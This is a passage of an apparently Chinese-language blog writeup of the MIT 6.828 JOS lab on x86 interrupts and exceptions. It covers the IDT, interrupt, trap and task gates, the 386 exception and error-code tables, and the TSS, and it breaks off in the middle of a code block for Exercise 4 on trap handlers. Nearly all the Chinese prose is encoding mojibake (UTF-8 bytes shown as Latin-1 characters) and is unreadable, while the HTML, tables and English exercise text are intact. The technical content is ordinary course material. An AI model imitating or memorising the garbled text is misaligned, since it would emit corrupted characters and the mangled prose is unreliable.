ä¸ªä¸­æ–­æè¿°ç¬¦ï¼ˆä¹Ÿå¯ä»¥å°‘äºè¿™ä¸ªæ•°é‡ï¼‰</p><p>ä¸­æ–­æè¿°ç¬¦è¡¨çš„åœ°å€å­˜æ”¾åœ¨ IDT å¯„å­˜å™¨ï¼ˆIDTRï¼‰ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>lidt</code> æŒ‡ä»¤ï¼ˆé€šè¿‡çº¿æ€§åœ°å€è£…è½½ IDTï¼Œåªèƒ½åœ¨ 0 ç‰¹æƒçº§ä¸‹æ‰§è¡Œï¼‰ä¸ <code>sidt</code> æŒ‡ä»¤ï¼ˆæ‹·è´å½“å‰ IDTR çš„å€¼ï¼Œå¯ä»¥åœ¨ä»»ä½•ç‰¹æƒçº§ä¸‹æ‰§è¡Œï¼‰æ“ä½œ IDTR</p><p>ä¸­æ–­æè¿°ç¬¦è¡¨çš„ç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2022/03/17/vPQKmeGVhyJ3ADT.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/03/17/5WujsrOYPpkMIze.png" alt="image.png"></p><h4 id="IDT-Descriptor">IDT Descriptor</h4><p>ä¸­æ–­æè¿°ç¬¦è¡¨ä¸­åŒ…å«å¦‚ä¸‹ä¸‰ç§æè¿°ç¬¦ï¼š</p><ul><li>ä»»åŠ¡é—¨ï¼ˆç”¨ä½œä»»åŠ¡åˆ‡æ¢ï¼Œåé¢å¯èƒ½ä¼šè®²åˆ°ï¼‰</li><li>ä¸­æ–­é—¨</li><li>é™·é˜±é—¨</li></ul><p>æè¿°ç¬¦çš„ç»“æ„å¦‚ä¸‹æ‰€ç¤º</p><p><img src="https://s2.loli.net/2022/03/17/Q3GiDPscdyKmLIT.png" alt="image.png"></p><h4 id="Interrupt-Procedures">Interrupt Procedures</h4><p>å¦‚åŒ call æŒ‡ä»¤ä¸€èˆ¬ï¼Œä¸­æ–­ä¸å¼‚å¸¸å…¶å®å°±æ˜¯â€œcallâ€ä¸­æ–­å¤„ç†ç¨‹åºâ€”â€”å¤„ç†å™¨é€šè¿‡ä¸­æ–­æˆ–å¼‚å¸¸æ ‡å·ä½œä¸º IDT çš„ç´¢å¼•æ‰¾åˆ°å¯¹åº”çš„ä¸­æ–­æè¿°ç¬¦ï¼Œè‹¥æ˜¯ä¸€ä¸ªä¸­æ–­é—¨æˆ–é™·é˜±é—¨åˆ™å…¶ä¼šä»¥ç±»ä¼¼â€œcallâ€è°ƒç”¨é—¨çš„æ–¹å¼è°ƒç”¨å¤„ç†ç¨‹åºï¼Œè‹¥æ˜¯ä¸€ä¸ªä»»åŠ¡é—¨ï¼Œåˆ™ä¼šä»¥ç±»ä¼¼â€œcallâ€ä»»åŠ¡é—¨çš„æ–¹å¼å¼•èµ·ä»»åŠ¡åˆ‡æ¢</p><p>ä¸­æ–­é—¨ä¸é™·é˜±é—¨å¹¶ä¸ç›´æ¥æŒ‡å‘å¤„ç†ç¨‹åºï¼Œè€Œæ˜¯é€šè¿‡ä¸‹å›¾çš„æ–¹å¼æ‰¾åˆ°å¤„ç†ç¨‹åºåœ°å€ï¼šé—¨çš„é€‰æ‹©å­æŒ‡å‘ä¸€ä¸ª GDT/LDT ä¸­çš„å¯æ‰§è¡Œæ®µï¼Œé—¨çš„ offset åŸŸæŒ‡å‘ä¸­æ–­/å¼‚å¸¸å¤„ç†ç¨‹åºçš„å¼€å¤´</p><p><img src="https://s2.loli.net/2022/03/17/yoAXZpNmQDS3Vvr.png" alt="image.png"></p><p>å¦‚åŒ call æŒ‡ä»¤å¼•èµ·çš„æ§åˆ¶æµè½¬ç§»ä¸€èˆ¬ï¼Œä¸­æ–­ä¸å¼‚å¸¸çš„å¤„ç†è¿‡ç¨‹åŒæ ·ä½¿ç”¨å †æ ˆå­˜å‚¨è¿”å›åŸå§‹è¿‡ç¨‹æ‰€éœ€çš„ä¿¡æ¯ï¼Œå¹¶ä½¿ç”¨ iret æŒ‡ä»¤ä»æ ˆä¸Šæ¢å¤è¿™äº›ä¿¡æ¯ï¼Œå¦‚åŒä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2022/03/17/qWnwvs9NreXpuiD.png" alt="image.png"></p><p>åœ¨é€šè¿‡ä¸­æ–­é—¨æˆ–é™·é˜±é—¨åä¼šå°† eflags å­˜åˆ°æ ˆä¸Šï¼Œå¹¶é‡ç½® TF ï¼ˆtrap flagï¼‰æ ‡å¿—ä½ï¼Œä»¥æ­¤é˜²æ­¢å•æ­¥æ‰§è¡Œçš„è°ƒè¯•è¿‡ç¨‹å½±å“ä¸­æ–­å“åº”ï¼Œå®Œæˆå iret æŒ‡ä»¤ä¼šä»æ ˆä¸Šæ¢å¤ eflagsï¼Œéœ€è¦æ³¨æ„çš„æ˜¯é€šè¿‡ä¸­æ–­é—¨åä¼šé‡ç½® IF ï¼Œä½†é€šè¿‡é™·é˜±é—¨å¹¶ä¸ä¼šé‡ç½® IF</p><p>åœ¨ä¸­æ–­è¿‡ç¨‹ä¸­ CPU ä¸å…è®¸å°†æ§åˆ¶æƒè½¬ç§»åˆ°ä½äºå½“å‰ç‰¹æƒçº§çš„æ®µä¸Šï¼Œå¦åˆ™ä¼šè§¦å‘ general protection faultï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»»ä¸€ä¸‹åˆ—ç­–ç•¥é˜²æ­¢è¿™ç§æƒ…å†µçš„å‘ç”Ÿï¼š</p><ul><li>å°†å¤„ç†ç¨‹åºæ”¾åœ¨åˆé€‚çš„æ®µä¸­ï¼Œè¿™æ ·çš„ç­–ç•¥é€‚åˆä¸€äº›ç‰¹æ®Šçš„å¼‚å¸¸å¤„ç†ç¨‹åºï¼ˆä¾‹å¦‚ divided by zeroï¼‰ï¼Œè¿™æ ·çš„å¤„ç†ç¨‹åºå¿…é¡»ä»…ä½¿ç”¨å †æ ˆä¸­çš„å¯ç”¨æ•°æ®ï¼Œè‹¥å…¶éœ€è¦æ¥è‡ªæ•°æ®æ®µçš„æ•°æ®ï¼Œåˆ™éœ€è¦ç¡®ä¿æ•°æ®æ®µçš„ç‰¹æƒçº§ä¸º 3ï¼Œä»è€Œä½¿å…¶ä¸å—è®¿é—®ä¿æŠ¤</li><li>å°†å¤„ç†ç¨‹åºæ”¾åœ¨ç‰¹æƒçº§ 0 çš„æ®µä¸­</li></ul><h4 id="Interrupt-Tasks">Interrupt Tasks</h4><p>IDT ä¸­çš„ä»»åŠ¡é—¨å¹¶ä¸ç›´æ¥æŒ‡å‘ä¸€ä¸ªä»»åŠ¡ï¼Œå¦‚åŒä¸‹å›¾æ‰€ç¤ºï¼Œé—¨çš„é€‰æ‹©å­æŒ‡å‘ GDT ä¸­çš„ä¸€ä¸ª TSS æè¿°ç¬¦ï¼Œå½“ä¸­æ–­æˆ–å¼‚å¸¸è§¦å‘é€šè¿‡ä»»åŠ¡é—¨æ—¶ï¼Œå°†ä¼šè¿›è¡Œä»»åŠ¡çš„åˆ‡æ¢</p><p><img src="https://s2.loli.net/2022/03/17/GZBLwKDji6f7gdC.png" alt="image.png"></p><p>ä½¿ç”¨ä¸€ä¸ªç‹¬ç«‹çš„ä»»åŠ¡æ¥å¤„ç†ä¸­æ–­æœ‰å¦‚ä¸‹ä¼˜ç‚¹ï¼š</p><ul><li>ä¼šè‡ªåŠ¨ä¿å­˜è¿›ç¨‹ä¸Šä¸‹æ–‡</li><li>ä¸­æ–­å¤„ç†ç¨‹åºå¯ä»¥é€šè¿‡ä¸€ä¸ªå•ç‹¬çš„åœ°å€ç©ºé—´ä¸å…¶ä»–ä»»åŠ¡ç‹¬ç«‹å¼€æ¥ï¼Œæ¯”å¦‚é€šè¿‡ä¸€ä¸ª LDT æˆ– ç‹¬ç«‹é¡µè¡¨</li></ul><p>ä»»åŠ¡çš„åˆ‡æ¢å‚è§ <a href="https://pdos.csail.mit.edu/6.828/2018/readings/i386/c07.htm">Chapter 7</a>.ï¼Œéœ€è¦è¯´æ˜çš„æ˜¯ä¸­æ–­ä»»åŠ¡åŒæ ·é€šè¿‡ iret æŒ‡ä»¤è¿”å›åŸè¿›ç¨‹ï¼›è‹¥æ˜¯ä»»åŠ¡åˆ‡æ¢æ˜¯ç”±ä¸€ä¸ªå¸¦ç€é”™è¯¯ä»£ç çš„å¼‚å¸¸å¼•èµ·çš„ï¼Œåˆ™å¤„ç†å™¨ä¼šè‡ªåŠ¨å°†é”™è¯¯ä»£ç å­˜åˆ°å¤„ç†ç¨‹åºçš„æ ˆä¸Š</p><p>åœ¨ 80386 ä¸­ä½¿ç”¨ä¸­æ–­ä»»åŠ¡æ—¶ï¼Œå®é™…ä¸Šæœ‰ä¸¤ä¸ªè°ƒåº¦å™¨ï¼šè½¯ä»¶è°ƒåº¦å™¨ï¼ˆOSçš„ä¸€éƒ¨åˆ†ï¼‰ä¸ç¡¬ä»¶è°ƒåº¦å™¨ï¼ˆå¤„ç†å™¨ä¸­æ–­æœºåˆ¶çš„ä¸€éƒ¨åˆ†ï¼‰ï¼Œè½¯ä»¶è°ƒåº¦å™¨çš„è®¾è®¡åº”è¯¥è€ƒè™‘åˆ°ç¡¬ä»¶è°ƒåº¦å™¨å¯ä»¥åœ¨å¯ç”¨ä¸­æ–­æ—¶è°ƒåº¦ä¸­æ–­ä»»åŠ¡è¿™ä¸€äº‹å®</p><h4 id="Interrupt-Summary">Interrupt Summary</h4><p>ä¸‹è¡¨æ€»ç»“äº† 386 æ‰€è¯†åˆ«çš„å¼‚å¸¸ï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Table</span> <span class="hljs-number">9</span><span class="hljs-number">-6.</span> <span class="hljs-keyword">Exception</span> <span class="hljs-keyword">Summary</span><br><br>Description               Interrupt   <span class="hljs-keyword">Return</span> Address  <span class="hljs-keyword">Exception</span>     <span class="hljs-keyword">Function</span> That Can Generate<br>Number      Points <span class="hljs-keyword">to</span>       <span class="hljs-keyword">Type</span>          the <span class="hljs-keyword">Exception</span><br>Faulting<br>Instruction<br><br>Divide error               <span class="hljs-number">0</span>          YES             FAULT         DIV, IDIV<br><span class="hljs-keyword">Debug</span> exceptions           <span class="hljs-number">1</span><br><span class="hljs-keyword">Some</span> <span class="hljs-keyword">debug</span> exceptions are traps <span class="hljs-keyword">and</span> <span class="hljs-keyword">some</span> are faults.  The <span class="hljs-keyword">exception</span><br><span class="hljs-keyword">handler</span> can determine which has occurred <span class="hljs-keyword">by</span> examining DR6.  (Refer <span class="hljs-keyword">to</span> Chapter <span class="hljs-number">12.</span>)<br><span class="hljs-keyword">Some</span> <span class="hljs-keyword">debug</span> exceptions are traps <span class="hljs-keyword">and</span> <span class="hljs-keyword">some</span> are faults.  The <span class="hljs-keyword">exception</span><br><span class="hljs-keyword">handler</span> can determine which has occurred <span class="hljs-keyword">by</span> examining DR6.  (Refer <span class="hljs-keyword">to</span> Chapter <span class="hljs-number">12.</span>) <span class="hljs-keyword">Any</span> instruction<br>Breakpoint                 <span class="hljs-number">3</span>          <span class="hljs-keyword">NO</span>              TRAP          One-byte <span class="hljs-type">INT</span> <span class="hljs-number">3</span><br>Overflow                   <span class="hljs-number">4</span>          <span class="hljs-keyword">NO</span>              TRAP          <span class="hljs-keyword">INTO</span><br>Bounds <span class="hljs-keyword">check</span>               <span class="hljs-number">5</span>          YES             FAULT         BOUND<br>Invalid opcode             <span class="hljs-number">6</span>          YES             FAULT         <span class="hljs-keyword">Any</span> illegal instruction<br>Coprocessor <span class="hljs-keyword">not</span> available  <span class="hljs-number">7</span>          YES             FAULT         ESC, WAIT<br><span class="hljs-type">Double</span> fault               <span class="hljs-number">8</span>          YES             <span class="hljs-keyword">ABORT</span>         <span class="hljs-keyword">Any</span> instruction that can<br>generate an <span class="hljs-keyword">exception</span><br>Coprocessor Segment<br>Overrun                    <span class="hljs-number">9</span>          <span class="hljs-keyword">NO</span>              <span class="hljs-keyword">ABORT</span>         <span class="hljs-keyword">Any</span> operand <span class="hljs-keyword">of</span> an ESC<br>instruction that wraps around<br>the <span class="hljs-keyword">end</span> <span class="hljs-keyword">of</span> a segment.<br>Invalid TSS               <span class="hljs-number">10</span>          YES             FAULT<br>An invalid-TSS fault <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> restartable <span class="hljs-keyword">if</span> it occurs during the<br>processing <span class="hljs-keyword">of</span> an <span class="hljs-keyword">external</span> interrupt.        JMP, <span class="hljs-keyword">CALL</span>, IRET, <span class="hljs-keyword">any</span> interrupt<br>Segment <span class="hljs-keyword">not</span> present       <span class="hljs-number">11</span>          YES             FAULT         <span class="hljs-keyword">Any</span> segment-register modifier<br>Stack <span class="hljs-keyword">exception</span>           <span class="hljs-number">12</span>          YES             FAULT         <span class="hljs-keyword">Any</span> memory reference thru SS<br>General Protection        <span class="hljs-number">13</span>          YES             FAULT/<span class="hljs-keyword">ABORT</span><br><span class="hljs-keyword">All</span> GP faults are restartable. <span class="hljs-keyword">If</span> the fault occurs <span class="hljs-keyword">while</span> attempting <span class="hljs-keyword">to</span><br>vector <span class="hljs-keyword">to</span> the <span class="hljs-keyword">handler</span> <span class="hljs-keyword">for</span> an <span class="hljs-keyword">external</span> interrupt, the interrupted program <span class="hljs-keyword">is</span><br>restartable, but the interrupt may be lost.  <span class="hljs-keyword">Any</span> memory reference <span class="hljs-keyword">or</span> code<br><span class="hljs-keyword">fetch</span><br>Page fault                <span class="hljs-number">14</span>          YES             FAULT         <span class="hljs-keyword">Any</span> memory reference <span class="hljs-keyword">or</span> code<br><span class="hljs-keyword">fetch</span><br>Coprocessor error         <span class="hljs-number">16</span>          YES             FAULT<br>Coprocessor errors are reported <span class="hljs-keyword">as</span> a fault <span class="hljs-keyword">on</span> the first ESC <span class="hljs-keyword">or</span> WAIT<br>instruction executed <span class="hljs-keyword">after</span> the ESC instruction that caused the error.        ESC, WAIT<br>Two-byte SW Interrupt     <span class="hljs-number">0</span><span class="hljs-number">-255</span>       <span class="hljs-keyword">NO</span>              TRAP          <span class="hljs-type">INT</span> n<br></code></pre></td></tr></table></figure><blockquote><p>è¯¦ç»†è¯´æ˜å‚è§ <a href="https://pdos.csail.mit.edu/6.828/2018/readings/i386/s09_08.htm">https://pdos.csail.mit.edu/6.828/2018/readings/i386/s09_08.htm</a></p></blockquote><h4 id="Error-Code">Error Code</h4><p>è‹¥å¼‚å¸¸ä¸ä¸€ä¸ªç‰¹å®šçš„æ®µç›¸å…³è”ï¼Œåˆ™å¤„ç†å™¨ä¼šå°†ä¸€ä¸ªé”™è¯¯ä»£ç å­˜åˆ°å¼‚å¸¸å¤„ç†ç¨‹åºçš„æ ˆä¸Šï¼Œæ ¼å¼å¦‚ä¸‹å›¾æ‰€ç¤º</p><p><img src="https://s2.loli.net/2022/03/17/zTLnsmHUW2RVYue.png" alt="image.png"></p><p>åœ¨é”™è¯¯ä»£ç ä¸­å¹¶ä¸åŒ…å«ç‰¹æƒçº§å­—æ®µï¼Œå–è€Œä»£ä¹‹çš„æ˜¯ä¸¤ä¸ªæ–°çš„ä½ï¼š</p><ul><li>EXT bitï¼šç¨‹åºå¤–éƒ¨çš„äº‹ä»¶é€ æˆäº†å¼‚å¸¸</li><li>I-bitï¼ˆIDT-bitï¼‰ï¼šé”™è¯¯ä»£ç çš„ index å­—æ®µå¼•ç”¨ IDT ä¸­çš„é—¨æè¿°ç¬¦</li></ul><p>è‹¥æœªè®¾ç½® I-bitï¼Œåˆ™ TI ä½æŒ‡ç¤ºé”™è¯¯ä»£ç å¼•ç”¨ GDTï¼ˆ0ï¼‰è¿˜æ˜¯ LDTï¼ˆ1ï¼‰ï¼Œå‰©ä¸‹çš„ 14 ä½ä¸ºæ®µé€‰æ‹©å­çš„é«˜ 14 ä½</p><p>ä¸‹è¡¨æ€»ç»“äº†å¼‚å¸¸ä¸­çš„é”™è¯¯ä»£ç ä¿¡æ¯ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Description                       Interrupt     <span class="hljs-built_in">Error</span> Code<br>Number<br><br>Divide <span class="hljs-built_in">error</span>                       0            <span class="hljs-literal">No</span><br><span class="hljs-built_in">Debug</span> exceptions                   1            <span class="hljs-literal">No</span><br>Breakpoint                         3            <span class="hljs-literal">No</span><br>Overflow                           4            <span class="hljs-literal">No</span><br>Bounds check                       5            <span class="hljs-literal">No</span><br>Invalid opcode                     6            <span class="hljs-literal">No</span><br>Coprocessor <span class="hljs-keyword">not</span> available          7            <span class="hljs-literal">No</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">System </span><span class="hljs-built_in">error</span>                       8            <span class="hljs-literal">Yes</span> (always 0)<br>Coprocessor Segment Overrun        9            <span class="hljs-literal">No</span><br>Invalid TSS                       10            <span class="hljs-literal">Yes</span><br>Segment <span class="hljs-keyword">not</span> present               11            <span class="hljs-literal">Yes</span><br>Stack exception                   12            <span class="hljs-literal">Yes</span><br>General protection fault          13            <span class="hljs-literal">Yes</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">Page </span>fault                        14            <span class="hljs-literal">Yes</span><br>Coprocessor <span class="hljs-built_in">error</span>                 16            <span class="hljs-literal">No</span><br>Two-byte SW interrupt             0-255         <span class="hljs-literal">No</span><br></code></pre></td></tr></table></figure><h3 id="Basics-of-Protected-Control-Transfer">Basics of Protected Control Transfer</h3><p>å¼‚å¸¸ä¸ä¸­æ–­éƒ½æ˜¯â€œè¢«ä¿æŠ¤çš„æ§åˆ¶æµåˆ‡æ¢â€â€”â€”å°†å¤„ç†å™¨åˆ‡æ¢è‡³å†…æ ¸æ€ï¼ˆCPL=0ï¼‰ï¼Œä¸”ä¸ä¼šç»™ç”¨æˆ·æ€ä»£ç å½±å“å†…æ ¸æˆ–å…¶ä»–ç¯å¢ƒçš„æœºä¼š</p><p>åœ¨ Intel æœ¯è¯­ä¸­ï¼Œä¸€ä¸ªä¸­æ–­é€šå¸¸æ˜¯ç”±å¤„ç†å™¨å¤–éƒ¨çš„å¼‚æ­¥äº‹ä»¶è§¦å‘çš„ï¼Œä¾‹å¦‚å¤–è®¾çš„ I/Oï¼›è€Œå¼‚å¸¸åˆ™æ˜¯ç”±å½“å‰è¿è¡Œçš„ä»£ç åŒæ­¥è§¦å‘çš„äº‹ä»¶ï¼Œä¾‹å¦‚éæ³•å†…å­˜è®¿é—®</p><p>ä¸ºäº†ç¡®ä¿ä¸­æ–­ä¸å¼‚å¸¸â€œçœŸæ­£å—åˆ°ä¿æŠ¤â€ï¼Œå…¶è¢«è®¾è®¡ä¸ºï¼šè§¦å‘å…¶çš„ä»£ç åªèƒ½åœ¨ç‰¹å®šæ¡ä»¶ä¸‹è¿›å…¥å†…æ ¸çš„ç‰¹å®šä½ç½®ï¼Œé€šè¿‡ä»¥ä¸‹ä¸¤ç§æœºåˆ¶ï¼š</p><ul><li><strong>ä¸­æ–­æè¿°ç¬¦è¡¨</strong>ï¼šå¤„ç†å™¨ç¡®ä¿ä¸­æ–­ä¸å¼‚å¸¸åªèƒ½é€šè¿‡ç‰¹å®šçš„å…¥å£ç‚¹è¿›å…¥å†…æ ¸ï¼Œè¿™ä¾¿æ˜¯ä¸­æ–­æè¿°ç¬¦è¡¨ä¸­çš„ã€Œé—¨ã€ç»“æ„ï¼Œx86å…è®¸å¤šè¾¾ 256 ä¸ªä¸åŒçš„å…¥å£ç‚¹â€”â€”å¯¹åº” 256 ä¸ªä¸­æ–­æè¿°ç¬¦è¡¨ç´¢å¼•ï¼Œå¤„ç†å™¨ä»è¯¥è¡¨ä¸­å¯¹åº”æ¡ç›®åŠ è½½ï¼š<ul><li>eipï¼šå¼‚å¸¸å¤„ç†ç¨‹åºä»£ç åœ°å€</li><li>csï¼šä»£ç æ®µé€‰æ‹©å­ï¼Œåœ¨å…¶ 0 ~ 1 ä½ä¸­åŒ…å«è¿è¡Œå¼‚å¸¸å¤„ç†ç¨‹åºçš„ç‰¹æƒçº§ï¼ˆåœ¨ JOS ä¸­æ‰€æœ‰å¼‚å¸¸éƒ½åœ¨ 0 ç‰¹æƒçº§ä¸‹å¤„ç†ï¼‰</li></ul></li><li><strong>ä»»åŠ¡çŠ¶æ€æ®µ</strong>ï¼šå¤„ç†å™¨éœ€è¦ä¸€ä¸ªåœ°æ–¹æ¥ä¿å­˜ä¸­æ–­å‘ç”Ÿå‰çš„ä¸Šä¸‹æ–‡ï¼Œä»¥ä¾¿åœ¨å®Œæˆå¤„ç†åæ¢å¤ä¸Šä¸‹æ–‡ï¼Œä½†è¿™ä¸ªåŒºåŸŸä¸åº”å½“è¢«ç”¨æˆ·è¿›ç¨‹è®¿é—®ï¼Œä¸­æ–­å¤„ç†éœ€è¦é™·å…¥å†…æ ¸ï¼Œäºæ˜¯ä¹Ÿéœ€è¦ç‹¬ç«‹çš„å†…æ ¸å †æ ˆï¼Œå› æ­¤<strong>ä»»åŠ¡çŠ¶æ€æ®µ</strong>ï¼ˆTSSï¼‰ç»“æ„æŒ‡å®šäº†å†…æ ¸å †æ ˆçš„åœ°å€ä¸æ®µé€‰æ‹©å­ï¼Œå¤„ç†å™¨å°†æ—§çš„ ssã€espã€eflagsã€csã€eipã€ï¼ˆå¯é€‰ï¼‰error code å‹åˆ°å†…æ ¸æ ˆä¸Šï¼Œä»ä¸­æ–­æè¿°ç¬¦ä¸­åŠ è½½ cs ä¸ eipï¼Œå¹¶è®¾ç½® <code>ss:esp</code> ä»¥å¼•ç”¨æ–°çš„å †æ ˆ</li></ul><p>æˆ‘ä»¬åœ¨ JOS ä¸­ TSS ä»…ç”¨æ¥å®šä¹‰ä»ç”¨æˆ·æ€åˆ‡æ¢åˆ°å†…æ ¸æ€æ—¶åº”åˆ‡æ¢åˆ°çš„å†…æ ¸å †æ ˆï¼Œä¸ä½¿ç”¨å…¶ä»–å­—æ®µ</p><h3 id="Types-of-Exceptions-and-Interrupts">Types of Exceptions and Interrupts</h3><p><s>è¯´è¿‡äº†.jpg</s></p><p>æœ¬èŠ‚æˆ‘ä»¬å°†æ‰©å±• JOS çš„ 0 ~31 å·å¼‚å¸¸å‘é‡ï¼Œä¸‹ä¸€å±Šæˆ‘ä»¬å°†æ‰©å±•è½¯ä¸­æ–­ï¼ˆ0x30ï¼‰ä½œä¸º JOS çš„ç³»ç»Ÿè°ƒç”¨å…¥å£ç‚¹ï¼Œåœ¨ lab4 ä¸­æˆ‘ä»¬å°†æ‰©å±• JOS ä»¥è®©å…¶å¤„ç†ç¡¬ä»¶ä¸­æ–­ï¼ˆä¾‹å¦‚æ—¶é’Ÿä¸­æ–­ï¼‰</p><h3 id="An-Example">An Example</h3><p><s>æ‡’å¾—çœ‹ï¼Œåæ­£å°±é‚£å›äº‹</s></p><h3 id="Nested-Exceptions-and-Interrupts">Nested Exceptions and Interrupts</h3><p>å¯¹äºå†…æ ¸ä¸­çš„åµŒå¥—ä¸­æ–­è€Œè¨€ä¸éœ€è¦é‡å¤åˆ‡æ¢å†…æ ¸å †æ ˆï¼Œåªéœ€è¦ä¿å­˜æ—§çš„ä¸Šä¸‹æ–‡åˆ°å†…æ ¸å †æ ˆä¸Šå³å¯</p><h3 id="Setting-Up-the-IDT">Setting Up the IDT</h3><p>æ¥ä¸‹æ¥æˆ‘ä»¬å°†è®¾ç½® IDT çš„ 0~31 å·ä¸­æ–­å‘é‡ï¼Œéšåæˆ‘ä»¬ä¼šè®¾ç½®ç³»ç»Ÿè°ƒç”¨ä¸­æ–­çš„å¤„ç†ç¨‹åºï¼Œåœ¨åé¢çš„ lab ä¸­è®¾ç½® 32 ~ 47 å·ä¸­æ–­ï¼ˆè®¾å¤‡ä¸­æ–­ï¼‰</p><p>æˆ‘ä»¬åº”å½“å®ç°å¦‚ä¸‹æ‰€ç¤ºæ§åˆ¶æµç¨‹ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">      IDT                   trapentry.S         trap.c</span><br><span class="hljs-code">   </span><br><span class="hljs-code">+----------------+</span>                        <br>|   &amp;handler1    |---------&gt; handler1:          trap (struct Trapframe *tf)<br>|                |             // do stuff      &#123;<br>|                |             call trap          // handle the exception/interrupt<br><span class="hljs-section">|                |             // ...           &#125;</span><br><span class="hljs-section">+----------------+</span><br>|   &amp;handler2    |--------&gt; handler2:<br>|                |            // do stuff<br>|                |            call trap<br><span class="hljs-section">|                |            // ...</span><br><span class="hljs-section">+----------------+</span><br><span class="hljs-code">       .</span><br><span class="hljs-code">       .</span><br><span class="hljs-section">       .</span><br><span class="hljs-section">+----------------+</span><br>|   &amp;handlerX    |--------&gt; handlerX:<br>|                |             // do stuff<br>|                |             call trap<br><span class="hljs-section">|                |             // ...</span><br><span class="hljs-section">+----------------+</span><br></code></pre></td></tr></table></figure><p>æ¯ä¸€ä¸ªå¼‚å¸¸æˆ–ä¸­æ–­éƒ½åº”åœ¨ <code>trapentry.S</code> ä¸­æœ‰å…¶è‡ªå·±çš„ handlerï¼Œè€Œ <code>trap_init()</code> åº”å½“åˆå§‹åŒ–è¿™äº› handlerï¼Œæ¯ä¸ª handler åº”å½“åœ¨æ ˆä¸Šå»ºç«‹ä¸€ä¸ª <code>struct Trapframe</code>ï¼ˆå‚è§ <code>inc/trap.h</code>ï¼‰å¹¶å°†å…¶æŒ‡é’ˆä½œä¸ºå‚æ•°è°ƒç”¨ <code>trap()</code>ï¼Œç”±å…¶å¯¹åº”è°ƒç”¨åˆ°ç›¸åº”çš„å¤„ç†å‡½æ•°</p><p>è¡¥å……äº†é‚£ä¹ˆå¤šçš„åŸºç¡€çŸ¥è¯†ï¼Œæ¥ä¸‹æ¥æ˜¯ Exercise 4â€”â€”ç¼–è¾‘ <code>trapentry.S</code> ä¸ <code>trap.c</code> å®ç°ä¸­æ–­ä¸å¼‚å¸¸å¤„ç†</p><blockquote><p><strong>Exercise 4.</strong> Edit <code>trapentry.S</code> and <code>trap.c</code> and implement the features described above. The macros <code>TRAPHANDLER</code> and <code>TRAPHANDLER_NOEC</code> in <code>trapentry.S</code> should help you, as well as the T_* defines in <code>inc/trap.h</code>. You will need to add an entry point in <code>trapentry.S</code> (using those macros) for each trap defined in <code>inc/trap.h</code>, and youâ€™ll have to provide <code>_alltraps</code> which the <code>TRAPHANDLER</code> macros refer to. You will also need to modify <code>trap_init()</code> to initialize the <code>idt</code> to point to each of these entry points defined in <code>trapentry.S</code>; the <code>SETGATE</code> macro will be helpful here.</p><p>Your <code>_alltraps</code> should:</p><ol><li>push values to make the stack look like a struct Trapframe</li><li>load <code>GD_KD</code> into <code>%ds</code> and <code>%es</code></li><li><code>pushl %esp</code> to pass a pointer to the Trapframe as an argument to trap()</li><li><code>call trap</code> (can <code>trap</code> ever return?)</li></ol><p>Consider using the <code>pushal</code> instruction; it fits nicely with the layout of the <code>struct Trapframe</code>.</p><p>Test your trap handling code using some of the test programs in the <code>user</code> directory that cause exceptions before making any system calls, such as <code>user/divzero</code>. You should be able to get make grade to succeed on the <code>divzero</code>, <code>softint</code>, and <code>badsegment</code> tests at this point.</p></blockquote><p>æˆ‘ä»¬éœ€è¦åœ¨ <code>trapentry.S</code> ä¸­å»ºç«‹ä¸­æ–­å…¥å£ç‚¹ï¼Œè¿™é‡Œ JOS é¢„å…ˆä¸ºæˆ‘ä»¬æä¾›äº†ä¸¤ä¸ªå®ç”¨æ¥å£°æ˜è¿™äº›å…¥å£ç‚¹ï¼Œä»–ä»¬æœ€ç»ˆéƒ½ä¼šè·³è½¬åˆ° <code>_alltraps</code> æ ‡å·å¤„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 